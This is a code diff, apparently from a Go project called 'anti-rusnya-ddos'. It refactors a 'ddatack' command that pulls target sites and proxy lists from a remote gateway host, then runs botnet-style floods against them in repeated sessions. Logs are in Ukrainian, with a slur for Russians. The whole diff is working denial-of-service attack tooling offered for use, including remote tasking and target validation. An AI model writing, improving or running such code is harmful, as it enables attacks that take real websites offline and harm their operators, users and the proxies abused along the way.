@@ -2,16 +2,19 @@ package cmd
 
 import (
 	"context"
-	"os"
-	"os/signal"
 	"sync"
-	"syscall"
+	"sync/atomic"
 	"time"
 
 	log "github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
 
 	"github.com/meddion/anti-rusnya-ddos/pkg"
+)
+
+const (
+	GATEWAY_TIMEOUT = time.Second * 10
+	SRC_TIMEOUT     = time.Second * 10
 )
 
 var (
@@ -22,6 +25,7 @@ var (
 		Run:   ddatackRun,
 	}
 	gateway string
+	src     string
 )
 
 func init() {
@@ -29,29 +33,25 @@ func init() {
 		&gateway,
 		"gateway",
 		"http://rockstarbloggers.ru/hosts.json",
-		"кількість ботів (активних з'єднань)",
+		"адреса, що повертає списки джерела для атаки",
+	)
+	ddatackCmd.PersistentFlags().StringVar(
+		&src,
+		"src",
+		"",
+		"джерело. адреса з якої отримати дані про атаку",
 	)
 }
 
 func ddatackRun(cmd *cobra.Command, args []string) {
 	// Shutdown signal
-	done := make(chan struct{}, 1)
-	var once sync.Once
-	terminate := func() {
-		once.Do(func() {
-			close(done)
-		})
-	}
-	// Os signal handler
-	sigs := make(chan os.Signal, 1)
-	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigs
-		terminate()
-		log.Infoln("Готуюся до закриття.")
-	}()
+	done, terminate := CreateDoneChan()
+	startOsSignalHandler(terminate)
 
-	for epoch := 0; true; epoch++ {
+	epoch := int64(0)
+	for {
+		atomic.AddInt64(&epoch, 1)
+
 		select {
 		case <-done:
 			return
@@ -59,47 +59,42 @@ func ddatackRun(cmd *cobra.Command, args []string) {
 		}
 
 		ctx, termBots := context.WithCancel(context.Background())
-		epochDone := make(chan struct{}, 1)
-		go func() {
-			select {
-			case <-epochDone:
-			case <-done:
-				termBots()
-			}
-		}()
+		startBotHandler(done, termBots, &epoch, epoch)
 
 		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
 		log.Infof("Кожні %d запитів ціль і проксі можуть змінюватися.\n", reqPerEpoch)
 
-		srcCtx, cancel := context.WithTimeout(ctx, time.Second)
-		src, err := pkg.GetSrcURL(srcCtx, gateway)
-		cancel()
-		if err != nil {
-			select {
-			case <-ctx.Done():
-				if _, ok := ctx.Deadline(); ok {
-					log.Infof("Час очікування на джерела закінчився")
-					close(epochDone)
-					continue
+		if src == "" {
+			srcCtx, cancel := context.WithTimeout(ctx, GATEWAY_TIMEOUT)
+			var err error
+			src, err = pkg.GetSrcURL(srcCtx, gateway)
+			cancel()
+			if err != nil {
+				select {
+				case <-ctx.Done():
+					if _, ok := ctx.Deadline(); ok {
+						log.Infof("Час очікування на джерела закінчився")
+						continue
+					}
+					return
+				default:
 				}
-				return
-			default:
-			}
 
-			log.Infof("Отримуємо списки джерел: %v\n", err)
-			continue
+				log.Infof("Отримуємо списки джерел: %v\n", err)
+				continue
+			}
 		}
+
 		log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)
 
-		srcCtx, cancel = context.WithTimeout(ctx, time.Second)
-		srcRsp, err := pkg.GetDataFromSrc(ctx, src)
+		srcCtx, cancel := context.WithTimeout(ctx, SRC_TIMEOUT)
+		srcRsp, err := pkg.GetDataFromSrc(srcCtx, src)
 		cancel()
 		if err != nil {
 			select {
 			case <-ctx.Done():
 				if _, ok := ctx.Deadline(); ok {
 					log.Infof("Час очікування від джерела закінчився")
-					close(epochDone)
 					continue
 				}
 				return
@@ -110,19 +105,22 @@ func ddatackRun(cmd *cobra.Command, args []string) {
 			continue
 		}
 
-		log.Infof("Дані із джерела підвантажено. Ціль: %s, К-ість проксі: %d\n", srcRsp.Site.URL, len(srcRsp.Proxies))
+		if err := pkg.ValidateTargetData(srcRsp); err != nil {
+			log.Errorf("Під час валідації даних про атаку (перевірте джерело): %v", err)
+			continue
+		}
+
+		log.Infof("Дані із джерела підвантажено. Ціль: %s, К-ість проксі: %d\n",
+			srcRsp.Site.URL, len(srcRsp.Proxies))
 
 		var wg sync.WaitGroup
 		counter := make(chan bool, botsNum)
-
 		if err := pkg.StartBots(ctx, &wg, srcRsp, maxErrCount, botsNum, counter); err != nil {
 			log.Errorf("Не вдалося запустити ботів: %v\n", err)
 			continue
 		}
-
 		go pkg.RequestLimiter(ctx, termBots, &wg, reqPerEpoch, counter)
 
 		wg.Wait()
-		close(epochDone)
 	}
 }
